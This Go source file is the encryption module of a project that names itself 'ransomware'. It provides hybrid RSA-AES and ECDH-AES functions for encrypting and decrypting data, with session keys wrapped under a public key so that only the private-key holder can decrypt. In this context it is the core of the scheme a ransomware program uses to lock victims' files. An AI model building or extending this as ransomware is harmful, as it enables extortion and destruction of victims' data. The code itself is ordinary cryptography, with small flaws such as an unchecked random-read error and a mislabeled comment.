package encryption

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"ransomware/encryption/aesLib"
	"ransomware/encryption/eccLib"
	"ransomware/encryption/rsaLib"
)

// Generates random 32 byte AES key and encrypts message with it, encrypts the AES key
// with RSA and then returns the encrypted AES key concatenated with the encrypted message
func RSAAESEncrypt(msg []byte, publicKey *rsa.PublicKey) ([]byte, error) {

	secret := make([]byte, 32)
	rand.Read(secret)

	hash := sha256.New()
	hash.Write(secret)
	aesKey := hash.Sum(nil)

	encrypted, err := aesLib.EncryptAES(msg, aesKey)
	if err != nil {
		return nil, err
	}
	aesKeyEncrypted, err := rsaLib.EncryptRSA(aesKey, publicKey)
	if err != nil {
		return nil, err
	}

	encrypted = append(aesKeyEncrypted, encrypted...)

	return encrypted, nil
}

// Decrypts messages encrypted with RSAAESEncrypt()
func RSAAESDecrypt(msg []byte, privateKey *rsa.PrivateKey) ([]byte, error) {

	aesKeyEncrypted, encryptedMessage := msg[:256], msg[256:]

	aesKey := rsaLib.DecryptRSA(aesKeyEncrypted, privateKey)

	decrypted, err := aesLib.DecryptAES(encryptedMessage, aesKey)
	if err != nil {
		return nil, err
	}

	return decrypted, nil
}

// Generates shared aes key with ECDH, then encrypts msg with it. Returns ECDH cipher public appended
// to encrypted msg
func ECDHAESEncrypt(msg []byte, publicKey *ecdsa.PublicKey) ([]byte, error) {

	aesKey, cipherPublicKey, err := eccLib.ECDHGenerateEncryptionKey(publicKey)
	if err != nil {
		return nil, err
	}

	cipherPublicMarshal := elliptic.MarshalCompressed(eccLib.Curve, cipherPublicKey.X, cipherPublicKey.Y)

	encrypted, err := aesLib.EncryptAES(msg, aesKey)
	if err != nil {
		return nil, err
	}

	encrypted = append(cipherPublicMarshal, encrypted...)

	return encrypted, nil
}

// Decrypts messages encrypted with ECDHAESDecrypt()
func ECDHAESDecrypt(msg []byte, privateKey *ecdsa.PrivateKey) ([]byte, error) {

	cipherPublicMarshal, encryptedMessage := msg[:33], msg[33:]

	x, y := elliptic.UnmarshalCompressed(eccLib.Curve, cipherPublicMarshal)

	cipherPublicKey := &ecdsa.PublicKey{Curve: eccLib.Curve, X: x, Y: y}

	aesKey, err := eccLib.ECDHGenerateDecryptionKey(privateKey, cipherPublicKey)
	if err != nil {
		return nil, err
	}

	decrypted, err := aesLib.DecryptAES(encryptedMessage, aesKey)
	if err != nil {
		return nil, err
	}

	return decrypted, nil
}
